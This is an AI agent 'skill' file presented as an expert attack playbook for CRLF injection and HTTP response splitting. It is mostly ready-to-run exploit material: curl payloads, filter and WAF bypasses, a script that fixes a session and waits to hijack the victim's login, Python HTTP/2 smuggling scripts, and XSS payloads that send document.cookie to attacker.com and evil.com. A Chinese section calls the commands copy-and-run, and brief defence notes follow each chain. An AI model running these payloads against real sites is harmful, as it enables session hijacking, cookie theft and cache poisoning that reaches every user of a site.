---
name: crlf-injection
description: >-
  CRLF injection playbook. Use when user input reaches HTTP response headers, Location redirects, Set-Cookie values, or log files where carriage-return/line-feed characters can split or inject content.
---

# SKILL: CRLF Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: CRLF injection (HTTP response splitting) techniques. Covers header injection, response body injection via double CRLF, XSS escalation, cache poisoning, and encoding bypass. Often overlooked by scanners but chains into XSS, session fixation, and cache attacks.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the target is a **Java service** and `%0D%0A` / `\r\n` encodings are WAF-blocked — substituting `瘍` (U+760D, low byte `\r`) and `瘊` (U+760A, low byte `\n`) injects a real CRLF through Angus Mail / Jakarta Mail SMTP, Apache HttpClient headers, JDK HttpServer responses, and ActiveJ HTTP (re-enables Jira CVE-2025-57733 and JDK CVE-2026-21933 classes)

## 1. CORE CONCEPT

CRLF = `\r\n` (Carriage Return + Line Feed, `%0D%0A`). HTTP headers are separated by CRLF. If user input is reflected in a response header without sanitization, injecting CRLF characters creates new headers or even a response body.

```
Normal: Location: /page?url=USER_INPUT
Attack: Location: /page?url=%0D%0ASet-Cookie:admin=true
Result: Two headers — Location + injected Set-Cookie
```

---

## 2. DETECTION

### Basic Probe

```text
%0D%0ANew-Header:injected

# In URL parameter:
https://target.com/redirect?url=%0D%0AX-Injected:true

# Check response headers for "X-Injected: true"
```

### Double CRLF — Body Injection

Two consecutive CRLF sequences end headers and start body:

```text
%0D%0A%0D%0A<script>alert(1)</script>

# Result:
HTTP/1.1 302 Found
Location: /page

<script>alert(1)</script>
```

---

## 3. EXPLOITATION SCENARIOS

### Session Fixation via Set-Cookie

```text
%0D%0ASet-Cookie:PHPSESSID=attacker_controlled_session_id
```

### XSS via Response Body

```text
%0D%0A%0D%0A<html><script>alert(document.cookie)</script></html>
```

### Cache Poisoning

If the response is cached by a CDN or proxy, injected headers/body are served to all users:

```text
GET /page?q=%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:text/html%0D%0A%0D%0A<script>alert(1)</script>
```

### Log Injection

CRLF in log-visible fields (User-Agent, Referer) can forge log entries:

```text
User-Agent: normal%0D%0A127.0.0.1 - admin [date] "GET /admin" 200
```

---

## 4. FILTER BYPASS

| Filter | Bypass |
|---|---|
| Blocks `%0D%0A` | Try `%0D` alone, `%0A` alone, or `%E5%98%8A%E5%98%8D` (Unicode) |
| URL decodes once | Double-encode: `%250D%250A` |
| Strips `\r\n` literally | Use URL-encoded form |
| Blocks in value only | Inject in parameter name |

```text
# Unicode/UTF-8 bypass:
%E5%98%8A%E5%98%8D  → decoded as CRLF in some parsers

# Double URL encoding:
%250D%250A → server decodes to %0D%0A → interpreted as CRLF

# Partial injection (LF only):
%0A → some servers accept LF without CR
```

---

## 5. REAL-WORLD EXPLOITATION CHAINS

### CRLF + Session Fixation

```text
# Inject Set-Cookie via CRLF in redirect parameter:
?url=%0D%0ASet-Cookie:PHPSESSID=attacker_controlled_session_id

# Result:
HTTP/1.1 302 Found
Location: /page
Set-Cookie: PHPSESSID=attacker_controlled_session_id

# Victim uses attacker's session → attacker hijacks after login
```

### CRLF → XSS via Double CRLF Body Injection

```text
# Two CRLF sequences end headers and inject response body:
?url=%0D%0A%0D%0A<script>alert(document.cookie)</script>

# Result:
HTTP/1.1 302 Found
Location: /page

<script>alert(document.cookie)</script>
```

### CRLF in 302 Location → Redirect Hijack

```text
# Inject new Location header before the original:
?url=%0D%0ALocation:http://evil.com%0D%0A%0D%0A

# Some servers use the LAST Location header → redirect to evil.com
```

---

## 6. COMMON VULNERABLE PATTERNS

```php
// PHP — header() with user input (PHP < 5.1.2 vulnerable):
header("Location: " . $_GET['url']);

// Python — redirect with unsanitized input:
return redirect(request.args.get('next'))

// Node.js — setHeader with user input:
res.setHeader('X-Custom', userInput);

// Java — response.setHeader with user input:
response.setHeader("Location", request.getParameter("url"));
```

---

## 7. TESTING CHECKLIST

```
□ Inject %0D%0A in redirect URL parameters
□ Inject %0D%0A in Set-Cookie name/value paths
□ Try double CRLF for body injection → XSS
□ Test encoding bypasses: double-encode, Unicode (%E5%98%8D%E5%98%8A), LF-only (%0A)
□ Check if response is cacheable → cache poisoning
□ Test in User-Agent / Referer for log injection
□ Test CRLF + Set-Cookie for session fixation
□ Verify if Location header can be injected in 302 responses
```

---

## 8. 2026 EMERGING TECHNIQUES

### 8.1 CRLF in HTTP/2 and HTTP/3 (QUIC)

HTTP/2 uses binary framing with `:authority`, `:path`, and `:status` pseudo-headers — CRLF is not used as a delimiter in the wire protocol. However, **HTTP/2 → HTTP/1.1 downgrade points** (ALPN negotiation, reverse proxies) re-introduce CRLF injection:

#### H2 → H1 Downgrade CRLF

```text
# HTTP/2 frontend proxy downgrades to HTTP/1.1 for backend
# User sends HTTP/2 request with header value containing CRLF
:authority: target.com
custom-header: value\r\nSet-Cookie:admin=true

# Proxy translates to HTTP/1.1:
Custom-header: value
Set-Cookie: admin=true   ← injected header in the H1 backend
```

#### HTTP/3 (QUIC) CRLF

HTTP/3 uses QUIC (UDP). CRLF injection in HTTP/3 occurs at the **application layer** after QUIC decryption:

```text
# HTTP/3 header field values are HPACK-encoded (QPACK)
# But if the application reflects user input into a response header
# without sanitizing \r\n, the injection happens at the app layer
# regardless of transport protocol

# Test: send via HTTP/3 (curl --http3)
curl --http3 "https://target.com/redirect?url=%0d%0aSet-Cookie:poisoned=true"
```

### 8.2 CRLF in API Gateways (2026)

Modern API gateways (Kong 3.x, AWS API Gateway, Azure APIM, Apigee X) process headers differently, creating differential CRLF behavior:

#### Kong 3.x — Header Transformation Plugin

```text
# Kong's request-transformer plugin may strip CRLF in one phase
# but the response-transformer plugin may not sanitize in another
# Test: inject CRLF in a response header that Kong passes through

# If Kong adds a correlation-id header from upstream:
X-Correlation-Id: user_input%0d%0aSet-Cookie:evil=true
```

#### AWS API Gateway — Header Mapping

```text
# AWS API Gateway mapping templates may pass CRLF through
# when mapping request parameters to integration request headers
# Method Request → Integration Request mapping:
#   "X-Custom": "$util.escapeJavaScript($input.params('x'))"
# If escapeJavaScript is not used, raw CRLF passes through
```

### 8.3 CRLF in Serverless / Edge Functions

#### Cloudflare Workers

```javascript
// Cloudflare Workers: response header injection
// Workers can set arbitrary headers, and CRLF in values may cause issues
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const redirect = url.searchParams.get('to')
  // Vulnerable: no CRLF sanitization on redirect value
  return new Response(null, {
    status: 302,
    headers: { 'Location': redirect }  // ← CRLF in 'to' parameter injects headers
  })
}
```

#### AWS Lambda@Edge / CloudFront Functions

```text
# Lambda@Edge response generation: if the Lambda sets headers
# from user input without sanitization, CRLF injection occurs
# in the CloudFront response to the viewer

# Test: inject via query parameter that Lambda@Edge reflects
?callback=%0d%0aSet-Cookie:session=attacker
```

### 8.4 CRLF in Modern Frameworks (2025-2026)

#### Spring Boot 3.x — ResponseEntity Header Injection

```java
// Spring Boot 3.x: ResponseEntity header injection
// While Spring 3 sanitizes most header values, custom headers
// set via HttpServletResponse.addHeader() may bypass sanitization
@GetMapping("/redirect")
public ResponseEntity<Void> redirect(@RequestParam String url) {
    HttpHeaders headers = new HttpHeaders();
    // Spring 3.x sanitizes this... BUT:
    headers.add("Location", url);
    // Custom non-standard header may not be sanitized:
    headers.add("X-Redirect-Reason", "user_requested:" + url);
    return new ResponseEntity<>(headers, HttpStatus.FOUND);
}
```

#### FastAPI / Starlette — Header Injection via Redirect

```python
# FastAPI: RedirectResponse header injection
from fastapi import FastAPI
from fastapi.responses import RedirectResponse

app = FastAPI()

@app.get("/redirect")
def redirect(url: str):
    # Starlette's RedirectResponse may not sanitize CRLF in all versions
    return RedirectResponse(url=url)
    # If url contains \r\n, additional headers may be injected
```

#### ASP.NET Core 8/9 — Response Headers.Add

```csharp
// ASP.NET Core 8/9: HttpResponse.Headers.Add
// While Kestrel sanitizes most headers, IIS (in-process hosting) may differ
app.MapGet("/redirect", (string url, HttpContext ctx) => {
    ctx.Response.Headers.Append("Location", url);
    ctx.Response.StatusCode = 302;
});
// Kestrel: blocks CRLF (throws ArgumentException)
// IIS in-process: may pass CRLF to the IIS HTTP stack → injection
```

### 8.5 Ghost Bits CRLF Bypass (Java)

Cross-reference [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md). When WAF blocks `%0d%0a` but the backend is Java:

```text
# Ghost Bits CRLF: 瘍 (U+760D, low byte \r) + 瘊 (U+760A, low byte \n)
# WAF sees: harmless CJK characters
# Java backend narrows char→byte: \r\n restored

# Payload for Java backends behind WAF:
?redirect=https://evil.com瘍瘊Set-Cookie:admin=true
```

This re-enables CRLF injection on patched CVEs like JDK CVE-2026-21933 (HttpServer response splitting) and Apache HttpClient ≤4.5.9 (request smuggling).

### 8.6 CRLF → Cache Poisoning in CDN (2026)

Modern CDNs (Cloudflare, Fastly, Akamai) have sophisticated cache key generation, but CRLF can still poison caches:

```text
# CDN cache key is typically: method + host + path + query
# But injected headers can alter what the origin returns, and
# the CDN caches that altered response

GET /page?lang=en%0d%0aX-Forwarded-Host:evil.com HTTP/1.1

# If the origin uses X-Forwarded-Host to generate absolute URLs:
# <link href="https://evil.com/css/style.css">
# CDN caches this response → all users get the poisoned page
```

**2026 CDN-specific note**: Cloudflare's Cache Reserve and Tiered Cache make cache poisoning more impactful — a poisoned response propagates to multiple tier caches before expiring.

### 8.7 2026 CRLF Quick Reference

| Context | Vector | Bypass |
|---|---|---|
| HTTP/2 → H1 downgrade | Header value with CRLF passes through proxy | Binary framing protects H2 but not downgraded H1 |
| HTTP/3 (QUIC) | Application-layer header injection | QPACK encoding doesn't sanitize app-level CRLF |
| Kong 3.x API Gateway | Response transformer passthrough | Differential sanitization between phases |
| Cloudflare Workers | `Response` header set with user input | Workers runtime does not strip CRLF |
| Spring Boot 3.x | Custom header via `HttpServletResponse` | Spring sanitizes standard headers, custom may bypass |
| FastAPI/Starlette | `RedirectResponse(url=param)` | Starlette may not sanitize in all versions |
| ASP.NET Core 8/9 (IIS) | `Headers.Append` with IIS hosting | Kestrel blocks, IIS may pass through |
| Java + Ghost Bits | `瘍瘊` instead of `%0d%0a` | WAF sees CJK, backend narrows to CRLF |

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 2026 年实战中高频出现的 4 条完整 CRLF 注入攻击链,包含可直接运行的 curl/python/bash 命令、分步利用、检测绕过技巧与真实 CVE 引用。所有代码注释为中文,即拷即用。

### 攻击链 1: CRLF 到 HTTP 响应分割(Response Splitting)

**目标画像**: 应用将用户输入反射到 `Location` 响应头(302 重定向),未过滤 `\r\n`。
**CVE 参考**: CVE-2026-21933(JDK HttpServer 响应分割,Ghost Bits 可复活)。

**步骤 1 - 检测 CRLF 注入点**:
```bash
# 发现反射点: redirect 参数被写入 Location 头
curl -sv "https://target.com/redirect?url=https://legit.com" 2>&1 | grep -i "location:"
# Location: https://legit.com

# 注入 CRLF 探测头
curl -sv "https://target.com/redirect?url=https://legit.com%0d%0aX-Injected:true" 2>&1 | grep -i "x-injected\|location"
# 若响应中出现 X-Injected: true -> CRLF 注入确认
```

**步骤 2 - 完整 HTTP 响应分割(注入第二个 HTTP 响应)**:
```bash
# 单个 CRLF 注入新头; 双 CRLF 终止头区并注入响应体
# 构造完整响应分割 payload(注入第二个 HTTP 响应)
PAYLOAD="https://legit.com%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:47%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html>"

curl -sv "https://target.com/redirect?url=${PAYLOAD}" 2>&1
# 服务端实际响应(被分割为两个 HTTP 响应):
# HTTP/1.1 302 Found
# Location: https://legit.com
# Content-Length: 0
# (空行终止头区)
# HTTP/1.1 200 OK           <- 注入的第二个响应
# Content-Type: text/html
# Content-Length: 47
# (空行终止头区)
# <html><script>alert(document.cookie)</script></html>
# 浏览器可能将第二个响应当作下一个请求的响应(响应队列投毒)
```

**步骤 3 - 利用响应分割实现存储型 XSS**:
```bash
# 构造让浏览器执行 JS 的 payload(现代浏览器对响应分割防护较强,但旧版/代理仍可中招)
# 完整 payload(注入 Set-Cookie + XSS body)
PAYLOAD="%0d%0aSet-Cookie:session=attacker_controlled;%20HttpOnly%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"

curl -sv "https://target.com/redirect?url=${PAYLOAD}" 2>&1 | grep -i "set-cookie\|script"
# 结果: 响应头被注入 Set-Cookie + 响应体被替换为 XSS 载荷
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: WAF 过滤 %0d%0a -> 使用 LF 单独(%0a, 部分服务器接受)
curl -sv "https://target.com/redirect?url=https://legit.com%0aX-Injected:true" 2>&1 | grep -i "x-injected"

# 绕过 2: 双重 URL 编码(WAF 解码一次, 应用再解码一次)
# %250d%250a -> WAF 看到 %250d%250a(非 CRLF)放行 -> 应用解码为 %0d%0a -> 再解码为 \r\n
curl -sv "https://target.com/redirect?url=https://legit.com%250d%250aX-Injected:true" 2>&1 | grep -i "x-injected"

# 绕过 3: Unicode 编码(%E5%98%8A%E5%98%8D, 部分 Java 解析器接受)
curl -sv "https://target.com/redirect?url=https://legit.com%E5%98%8AE5%98%8DX-Injected:true" 2>&1 | grep -i "x-injected"

# 绕过 4: Ghost Bits(Java 后端, WAF 屏蔽 %0d%0a)
# 使用瘍(U+760D, 低字节 \r) + 瘊(U+760A, 低字节 \n)
# WAF 看到的是无害 CJK 字符, Java 后端 char->byte 截断恢复 \r\n
curl -sv "https://target.com/redirect?url=https://legit.com瘍瘊X-Injected:true" 2>&1 | grep -i "x-injected"

# 绕过 5: 注入到非标准头(标准头被过滤, 自定义头未过滤)
curl -sv "https://target.com/redirect?url=https://legit.com%0d%0aX-Custom-Reason:user_requested" 2>&1 | grep -i "x-custom-reason"
```

**防御要点**: 严禁将用户输入直接写入响应头;对所有反射到头部的输入做 `\r\n` 过滤/编码;使用框架的安全 API(如 Spring 的 `ResponseEntity`);启用 HSTS + CSP 减轻响应分割影响。

---

### 攻击链 2: CRLF 到会话固定(Set-Cookie 注入)

**目标画像**: 应用有登录流程,但某反射点(如 redirect 参数)可注入 `Set-Cookie` 头。
**CVE 参考**: CVE-2026-21933(JDK HttpServer);经典会话固定 CWE-384。

**步骤 1 - 注入攻击者控制的 session cookie**:
```bash
# 场景: 受害者访问攻击者构造的链接, 链接触发 CRLF 注入 Set-Cookie
# 攻击者先获取一个有效的 session(用自己的账户登录)
# session_id=S_ATTACKER_SESSION_12345

# 构造注入 Set-Cookie 的 payload
# 将攻击者的 session ID 注入到受害者浏览器
PAYLOAD="%0d%0aSet-Cookie:PHPSESSID=S_ATTACKER_SESSION_12345;%20Path=/;%20HttpOnly"

# 攻击者发送钓鱼链接给受害者:
PHISH_URL="https://target.com/redirect?url=https://legit.com${PAYLOAD}"
# 受害者点击 -> 浏览器收到 Set-Cookie: PHPSESSID=S_ATTACKER_SESSION_12345
# 受害者浏览器现在使用攻击者的 session ID
```

**步骤 2 - 等待受害者登录后劫持会话**:
```bash
# 受害者使用攻击者的 session ID 登录(输入自己的密码)
# 登录后, 该 session ID 关联到受害者的账户(session 未重新生成)
# 攻击者用相同的 session ID 访问 -> 已是受害者登录状态

# 攻击者检查 session 是否已登录
curl -sk "https://target.com/dashboard" \
  -H "Cookie: PHPSESSID=S_ATTACKER_SESSION_12345"
# 若返回受害者的 dashboard -> 会话固定 + 劫持成功

# 自动化等待脚本(轮询检查 session 是否被使用)
while true; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com/dashboard" \
    -H "Cookie: PHPSESSID=S_ATTACKER_SESSION_12345")
  if [ "$STATUS" = "200" ]; then
    echo "[+] 受害者已登录! session 被激活"
    # 立即提取受害者数据
    curl -sk "https://target.com/api/profile" -H "Cookie: PHPSESSID=S_ATTACKER_SESSION_12345"
    break
  fi
  echo "等待受害者登录... (当前: $STATUS)"
  sleep 10
done
```

**步骤 3 - 结合响应分割的完整会话固定链**:
```python
#!/usr/bin/env python3
# 文件名: session_fixation_crlf.py
# CRLF 会话固定攻击自动化
# 场景: 攻击者先登录获取 session, 再通过 CRLF 注入到受害者浏览器
import requests, urllib3, time
urllib3.disable_warnings()

TARGET = "https://target.com"

# 步骤 1: 攻击者登录, 获取 session ID
s = requests.Session()
s.post(f"{TARGET}/login", data={"username":"attacker","password":"attacker_pass"}, verify=False)
session_id = s.cookies.get("PHPSESSID")
print(f"[+] 攻击者 session: {session_id}")

# 步骤 2: 登出(但 session 在服务端仍有效 - 测试 session 是否在登出后失效)
s.get(f"{TARGET}/logout", verify=False)

# 步骤 3: 构造 CRLF 注入链接(将攻击者 session 注入受害者)
crlf_payload = f"%0d%0aSet-Cookie:PHPSESSID={session_id};%20Path=/;%20HttpOnly"
phish_url = f"{TARGET}/redirect?url=https://legit.com{crlf_payload}"
print(f"[+] 钓鱼链接: {phish_url}")

# 步骤 4: 轮询等待受害者使用该 session 登录
print("[*] 等待受害者登录(发送钓鱼链接给受害者)...")
for i in range(60):  # 最多等 10 分钟
    r = requests.get(f"{TARGET}/dashboard",
                     cookies={"PHPSESSID": session_id}, verify=False)
    if r.status_code == 200 and "attacker" not in r.text.lower():
        # session 已被受害者使用(不再是攻击者账户)
        print(f"[+] 受害者已登录! 等待 {i*10} 秒")
        # 提取受害者数据
        profile = requests.get(f"{TARGET}/api/profile",
                               cookies={"PHPSESSID": session_id}, verify=False)
        print(f"[+] 受害者数据: {profile.text[:500]}")
        break
    time.sleep(10)
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 若应用在登录后重新生成 session, 但部分路径未更新 cookie
# 攻击者注入 cookie 到特定 Path, 绕过全站 session 重新生成
PAYLOAD="%0d%0aSet-Cookie:PHPSESSID=ATTACKER;%20Path=/api;%20HttpOnly"
# /api 路径仍使用攻击者 session

# 绕过 2: 注入多个 Set-Cookie(部分浏览器取第一个, 部分取最后一个)
PAYLOAD="%0d%0aSet-Cookie:LEGIT=1%0d%0aSet-Cookie:PHPSESSID=ATTACKER;%20Path=/"

# 绕过 3: 利用子域名 cookie 注入(若 cookie domain 可控)
PAYLOAD="%0d%0aSet-Cookie:session=ATTACKER;%20Domain=.target.com;%20Path=/"
```

**防御要点**: 登录后必须重新生成 session ID(`session_regenerate_id()`);设置 `Set-Cookie` 的 `HttpOnly` + `Secure` + `SameSite`;严禁 CRLF 进入响应头;登录时校验 session 是否来自当前用户。

---

### 攻击链 3: CRLF 到缓存投毒

**目标画像**: CDN/反向代理(Cloudflare/Fastly/Nginx)缓存响应,攻击者通过 CRLF 注入修改被缓存的响应。
**CVE 参考**: 2026 年 Cloudflare Cache Reserve + Tiered Cache 扩大缓存投毒影响(见技能 8.6 节)。

**步骤 1 - 识别缓存行为与缓存键**:
```bash
# 测试目标页面是否被缓存
curl -sk -I "https://target.com/page?lang=en" | grep -i "cache-control\|x-cache\|age\|cf-cache"
# 若返回 cf-cache-status: HIT 或 age: 60 -> 该页面被缓存

# 识别缓存键(通常为 method + host + path + query)
# 测试不同 query 参数是否命中同一缓存
curl -sk -I "https://target.com/page?lang=en&unused=x" | grep -i "age"
curl -sk -I "https://target.com/page?lang=en" | grep -i "age"
# 若 age 相同 -> unused 参数不影响缓存键(unkeyed header 攻击面)
```

**步骤 2 - 通过 CRLF 注入投毒缓存响应**:
```bash
# 场景: redirect 参数被反射到 Location 头, 且该响应被缓存
# 攻击者注入恶意 Location + body, 该投毒响应被缓存后服务给所有用户

# 构造投毒 payload(注入恶意重定向 + XSS body)
POISON_URL="https://target.com/redirect?url=https://legit.com%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aX-Forwarded-Host:evil.com%0d%0a%0d%0a<script>fetch('https://evil.com/steal?'+document.cookie)</script>"

# 发送投毒请求(首次请求 -> 缓存投毒响应)
curl -sk "${POISON_URL}" -o /dev/null -w "投毒请求: HTTP %{http_code}\n"

# 验证缓存是否被投毒(其他用户访问同 URL 得到投毒响应)
curl -sk "https://target.com/redirect?url=https://legit.com" | grep -i "script\|evil.com"
# 若返回投毒内容 -> 缓存投毒成功, 所有访问该 URL 的用户受影响
```

**步骤 3 - 利用 X-Forwarded-Host 注入投毒绝对 URL**:
```bash
# 场景: 应用使用 X-Forwarded-Host 生成页面中的绝对 URL(如 CSS/JS/链接)
# 攻击者通过 CRLF 注入 X-Forwarded-Host, 使缓存的页面包含恶意资源引用

# 投毒请求(注入 X-Forwarded-Host)
curl -sk "https://target.com/page?lang=en%0d%0aX-Forwarded-Host:evil.com" -o /dev/null -w "投毒: HTTP %{http_code}\n"
# 应用生成: <link href="https://evil.com/css/style.css">
# CDN 缓存此响应 -> 所有用户加载 evil.com 的 CSS(可注入恶意 JS/CSS)

# 验证缓存内容是否包含恶意 host
curl -sk "https://target.com/page?lang=en" | grep -i "evil.com"
# 若包含 -> 缓存投毒成功
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 使用未键入缓存键的参数投毒
# 若 unused 参数不影响缓存键, 攻击者用不同 unused 值投毒但命中同一缓存
curl -sk "https://target.com/page?lang=en&unused=poison${CRLF_PAYLOAD}" -o /dev/null

# 绕过 2: 利用 Fat GET(请求体影响缓存但不在缓存键中)
# 部分缓存实现忽略请求体, 但源站读取请求体
curl -sk "https://target.com/page?lang=en" -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "url=https://evil.com%0d%0aX-Forwarded-Host:evil.com"

# 绕过 3: HTTP/2 降级点 CRLF(前端 h2 不检查 CRLF, 后端 h1.1 被注入)
curl -sk --http2 "https://target.com/page?lang=en%0d%0aX-Forwarded-Host:evil.com"

# 绕过 4: CDN 缓存键包含 Host, 但攻击者注入不同的 X-Forwarded-Host
# (CDN 用 Host 做键, 源站用 X-Forwarded-Host 生成内容)
```

**防御要点**: 缓存键应包含所有影响响应的输入;CDN 应过滤/忽略 `X-Forwarded-Host` 等可注入头;源站不应信任未验证的 `X-Forwarded-*` 头;对反射到头部的输入严格过滤 CRLF。

---

### 攻击链 4: 2026 - HTTP/2 头部 HPACK 操纵型 CRLF

**目标画像**: HTTP/2 前端(h2)+ HTTP/1.1 后端(h1.1)降级架构,前端接受 h2 二进制头但后端按文本解析。
**CVE 参考**: CVE-2026-21933(JDK HttpServer 响应分割);2026 年 H2.CRLF 降级注入趋势(见 403 技能 10.4 节)。

**步骤 1 - 识别 H2 -> H1 降级点**:
```bash
# 检测目标是否支持 HTTP/2
curl -sk -I --http2 "https://target.com/" | grep -i "HTTP/2"

# 检测后端是否为 HTTP/1.1(通过 Server 头或行为判断)
curl -sk -I "https://target.com/" | grep -i "server"
# 若前端 h2 + 后端 h1.1 -> 存在降级点 -> CRLF 可注入

# 确认 h2 头值是否原样传递到后端(关键: 前端不过滤 CRLF)
# 测试自定义头是否到达后端
curl -sk --http2 -H "X-Test-Custom: value123" "https://target.com/echo" | grep -i "value123"
```

**步骤 2 - HTTP/2 头值 CRLF 注入(降级为 H1.1)**:
```bash
# HTTP/2 头值在 HPACK 编码中是二进制安全的, 可包含 \r\n
# 但降级为 HTTP/1.1 时, \r\n 被解释为头分隔符 -> 头注入

# 使用 nghttp2 或 h2c 工具发送包含 CRLF 的 h2 头
# 方法 1: 使用 curl 的 --http2 发送(部分版本允许)
curl -sk --http2 -H "X-Custom: value%0d%0aSet-Cookie:poisoned=true" "https://target.com/page"
# 若后端收到 Set-Cookie: poisoned=true -> H2.CRLF 注入成功

# 方法 2: 使用 Python hyper/h2 库发送原始 h2 帧
python3 << 'PYEOF'
# 文件名: h2_crlf_inject.py
# HTTP/2 头值 CRLF 注入(降级点攻击)
import ssl, h2.connection, h2.config, socket, urllib3
urllib3.disable_warnings()

# 建立 TLS + HTTP/2 连接
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(['h2'])

sock = socket.create_connection(("target.com", 443))
tls = ctx.wrap_socket(sock, server_hostname="target.com")
config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
conn.send(tls.send, tls.recv)  # 简化: 实际需循环处理

# 发送请求, 头值中包含 \r\n(HPACK 二进制安全, 但后端 h1.1 会分割)
conn.send_headers(stream_id=1, headers=[
    (':method', 'GET'),
    (':path', '/page'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    # 关键: 头值中注入 CRLF
    ('x-custom', 'value\r\nSet-Cookie: session=attacker; HttpOnly\r\nContent-Length: 0'),
])
conn.end_stream(stream_id=1)

# 前端 h2 接受该头(二进制安全), 降级为 h1.1 时:
# X-Custom: value
# Set-Cookie: session=attacker; HttpOnly  <- 注入的头
# Content-Length: 0
# 后端看到三个独立的头 -> 注入成功
PYEOF
```

**步骤 3 - 利用 H2.CRLF 实现请求走私 + 403 绕过**:
```bash
# 场景: 前端 h2 对 /admin 返回 403, 但通过 CRLF 注入走私第二个请求

# 构造 H2 请求, 头值中注入完整第二个 HTTP/1.1 请求
# 前端 h2 看到: GET /public(放行)
# 后端 h1.1 看到: GET /public + 走私的 GET /admin(200)
python3 << 'PYEOF'
# 文件名: h2_smuggle_crlf.py
# H2.CRLF 请求走私绕过前端 403
import ssl, h2.connection, h2.config, socket

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(['h2'])

sock = socket.create_connection(("target.com", 443))
tls = ctx.wrap_socket(sock, server_hostname="target.com")
config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()

# 注入走私请求: 前端看到 GET /public, 后端额外收到 GET /admin
smuggled = (
    "\r\nGET /admin HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Cookie: session=valid\r\n"
    "\r\n"
)
conn.send_headers(stream_id=1, headers=[
    (':method', 'GET'),
    (':path', '/public'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('transfer-encoding', f'chunked{smuggled}'),  # CRLF 注入走私请求
])
conn.end_stream(stream_id=1)
# 后端处理: /public + 走私的 /admin(绕过前端 ACL)
PYEOF
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: HTTP/2 CONTINUATION 帧滥用(2024 CVE-2024-27316 的变种)
# 发送大量 CONTINUATION 帧压缩头, CRLF 隐藏在压缩流中
# 后端解压后 \r\n 被恢复

# 绕过 2: HPACK 动态表注入
# 利用 HPACK 动态表缓存, 先注入含 CRLF 的头到动态表
# 后续请求引用动态表索引 -> CRLF 被恢复到后端

# 绕过 3: HTTP/3 (QUIC) 的 QPACK 编码
# QPACK 与 HPACK 类似, 但通过 UDP 传输
# 很多 WAF 不检查 UDP 流量 -> CRLF 直接到达应用层
curl -sk --http3 "https://target.com/redirect?url=https://legit.com%0d%0aSet-Cookie:poisoned=true"
# (需 curl 支持 HTTP/3: curl --http3)

# 绕过 4: 利用 h2 的伪头(:path)注入(部分实现未校验 :path 中的 CRLF)
# :path 值中注入 \r\n -> 降级为 h1.1 时路径被分割
```

**防御要点**: HTTP/2 -> HTTP/1.1 降级点必须过滤所有头值中的 `\r\n`;前端代理应拒绝包含 CRLF 的 h2 头;后端不应信任前端透传的头;使用 `nginx` 的 `proxy_set_header` 覆盖不可信头;HTTP/3 同样需在应用层过滤 CRLF。
